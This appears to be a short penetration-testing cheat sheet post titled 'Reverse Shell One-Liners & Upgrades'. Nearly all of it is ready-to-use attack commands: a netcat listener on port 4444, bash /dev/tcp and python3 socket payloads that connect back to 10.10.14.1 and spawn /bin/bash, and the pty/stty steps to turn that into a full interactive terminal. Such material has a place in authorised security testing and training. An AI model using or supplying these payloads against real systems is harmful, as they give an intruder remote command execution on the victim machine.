---
title: "Reverse Shell One-Liners & Upgrades"
date: 2026-07-22
tags: [shells, post-exploitation, cheatsheet]
---

The handful of reverse shells I actually reach for, plus how to turn an ugly
one into a real TTY.

## Catch it

```bash
# attacker
nc -lvnp 4444
```

## Fire it

```bash
# bash
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1

# python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.1",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

## Upgrade to a full TTY

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then background with Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

Now arrow keys, tab-completion, and `Ctrl-C` behave — worth the 10 seconds
before you start real work.
